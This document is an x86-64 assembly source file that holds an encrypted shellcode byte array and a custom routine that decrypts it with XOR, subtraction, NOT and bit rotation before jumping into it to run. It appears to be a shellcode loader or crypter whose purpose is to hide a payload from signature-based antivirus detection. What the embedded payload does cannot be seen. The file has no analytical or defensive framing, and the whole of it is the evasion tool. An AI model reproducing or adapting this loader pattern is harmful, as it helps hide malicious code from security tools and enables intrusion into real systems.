section .data
    ; Define the encryption key
    encryption_key dd 12345        ; Store the key as a double word

    ; Define the shellcode array based on the binary content
    shellcode db 0xa0, 0x33, 0x06, 0x9b, 0x19, 0xb8, 0xf9, 0x59, 0x22, 0x02, 0x36, 0x3f,   0x3b, 0x91, 0xce, 0x70, 0x17, 0xf2, 0x00, 0x69, 0x2c, 0x93, 0x1e, 0xec,   0x16, 0xdb, 0xe0, 0x2b, 0x72, 0xae, 0x07, 0x8e, 0x0c, 0x6d, 0x21, 0xc0,   0xed, 0xb5, 0xb1, 0x4f, 0xfe, 0xf6, 0x20, 0x76, 0x2c, 0xd6, 0x82, 0x8f,   0xd6, 0x93, 0x1c, 0xf8, 0x2c, 0x93, 0xe0, 0xc3, 0x88, 0x10, 0xa7, 0xff,   0xb0, 0xb5, 0xd0, 0x60, 0xc6, 0x8b, 0x1e, 0x1f, 0x03, 0x5d, 0xbb, 0x8e,   0x29, 0x12, 0x7f, 0x28, 0xc4, 0x6f, 0xf4, 0x11, 0xfe, 0xec, 0xbf, 0x28,   0x1b, 0x9f, 0xb1, 0xa7, 0x11, 0x3b, 0x36, 0x3f, 0x3b, 0xae, 0x48, 0x40,   0x93, 0x57, 0x21, 0x1f, 0x1d, 0xaf, 0xb1, 0xa7, 0x16, 0x29, 0x7f, 0xb7,   0xc4, 0xb1, 0xf4, 0x6f, 0x21, 0x02, 0xb2, 0xaa, 0x2c, 0xb8, 0x3f, 0x11,   0x29, 0xdb, 0xbc, 0x20, 0x2c, 0x99, 0x9e, 0xef, 0x2b, 0xe3, 0x21, 0x15,   0x23, 0x22, 0xd0, 0x60, 0xc6, 0x8b, 0x1e, 0x1f, 0x03, 0xb0, 0xdc, 0xea,   0xc3, 0x6d, 0xa1, 0xdf, 0xac, 0x35, 0xf7, 0xf0, 0x28, 0xe2, 0x84, 0x59,   0x2e, 0xf0, 0x70, 0xa7, 0x09, 0xa8, 0x01, 0x1f, 0x1d, 0xed, 0xb1, 0x70,   0xfe, 0xab, 0x21, 0x76, 0xb3, 0x46, 0xf0, 0xd5, 0x36, 0x04, 0x10, 0x76,   0x13, 0x46, 0x78, 0x47, 0x16, 0x04, 0x10, 0x17, 0x2e, 0x91, 0xed, 0x0d,   0x34, 0xf1, 0x1e, 0x2a, 0x13, 0x8c, 0xd0, 0x8d, 0x16, 0xd4, 0x95, 0x33,   0x13, 0x6f, 0xf9, 0x7c, 0x14, 0x0c, 0x03, 0xea, 0x72, 0xae, 0x07, 0x96,   0xc2, 0x13, 0x37, 0x3e, 0x3a, 0x0c, 0xb1, 0x4f, 0xbe, 0x9b, 0xfd, 0x1f,   0x3b, 0xb9, 0xd0, 0x81, 0x96, 0x56, 0x7a, 0x5f, 0x3a, 0xff, 0xcf, 0x20,   0x39, 0x24, 0x36, 0x3f, 0x3b, 0xf0, 0xef, 0xe7, 0xbf, 0x6b, 0x16, 0x3f,   0x3b, 0xf0, 0x6f, 0xe7, 0xb1, 0x49, 0x16, 0x3f, 0x3b, 0xae, 0xd2, 0x9f,   0x29, 0xfd, 0x9e, 0xcf, 0x6d, 0xd9, 0xf9, 0x1e, 0x16, 0x0e, 0xf1, 0x17,   0xe2, 0x9b, 0x42, 0x84, 0x57, 0x25, 0x70, 0x28, 0x8f, 0x2a, 0x6b, 0x2b,   0x8a, 0x28, 0x62, 0xed, 0x48, 0x0a, 0xf4, 0xef, 0xf7, 0x6c, 0x1a, 0x3f,   0x8c, 0x0d, 0x0a, 0xaa, 0x35, 0x50, 0x82, 0xf7, 0x48, 0xa8, 0xf8, 0xea,   0xf3, 0x90, 0xe4, 0xd5, 0xf1, 0xf2, 0x6c, 0xcb, 0x92, 0x24
    shellcode_len equ $ - shellcode   ; Calculate the length of the shellcode

section .text
global _start

_start:
    ; Example usage
    lea rsi, [rel shellcode]          ; Address of the shellcode
    mov edi, [rel encryption_key]   ; Encryption key
    mov rcx, shellcode_len      ; Length of the shellcode
    call decrypt

    ; Jump to the decrypted shellcode (assume it's executable and starts at 'shellcode')
    jmp rsi

; Decryption function
; Inputs:
;   RSI - pointer to data (shellcode)
;   RDI - encryption key
;   RCX - length of the data
decrypt:
    push rbp
    mov rbp, rsp
    sub rsp, 0x20        ; Allocate space for local variables

    mov [rbp-4], rcx    ; Save the original rcx (length) value on the stack
    xor rbx, rbx        ; Zero RBX to use as our index

decrypt_loop:
    mov rcx, [rbp-4]    ; Restore the original rcx value (length of the data)
    cmp rbx, rcx        ; Compare index (RBX) with length (RCX)
    jae decrypt_end     ; If index >= length, exit loop

    ; Load the current byte to a register (use RAX to perform operations)
    movzx eax, byte [rsi + rbx]

    ; XOR with (key >> (i % 8))
    mov rdx, rbx            ; Copy index to RDX
    and rdx, 7              ; RDX = i % 8
    mov r8, rdi             ; Copy key to R8
    mov r9, rdx             ; Use R9 to avoid overwriting RCX
    mov cl, r9b             ; Move the shift count into CL
    shr r8, cl              ; Shift key right by the value in CL

    xor eax, r8d                ; XOR the byte with shifted key

    ; Subtract the key
    sub eax, edi                ; Subtract the key

    ; NOT the byte
    not al                      ; Bitwise NOT of the lower byte

    ; Rotate left by 3
    rol al, 3                   ; Rotate left by 3 bits

    ; Store the result back
    mov [rsi + rbx], al         ; Store the transformed byte back into memory

    inc rbx                     ; Increment index
    jmp decrypt_loop            ; Repeat for next byte


decrypt_end:
    add rsp, 0x20        ; Clean up the stack space
    pop rbp
    ret
